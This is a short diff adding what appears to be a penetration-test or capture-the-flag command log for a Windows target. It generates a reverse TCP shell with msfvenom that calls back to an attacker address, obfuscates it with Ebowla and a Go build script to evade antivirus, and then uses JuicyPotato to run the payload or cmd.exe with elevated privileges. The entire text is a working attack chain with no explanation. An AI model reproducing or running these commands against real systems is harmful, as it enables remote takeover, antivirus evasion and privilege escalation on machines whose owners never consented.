@@ -1,0 +1,9 @@
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 LPORT=4444 LHOST=10.10.16.112 -f exe > shell.exe
+
+python ebowla.py shell.exe geneticustom.config
+
+./build_x64_go.sh output/go_symmetric_shell.exe.go tally.exe
+
+C:\Windows\Temp\test\juicy.exe -t * -p C:\Windows\Temp\test\tally.exe -l 4444
+
+C:\Windows\Temp\test\juicy.exe -t * -p C:\Windows\system32\cmd.exe -l 4444
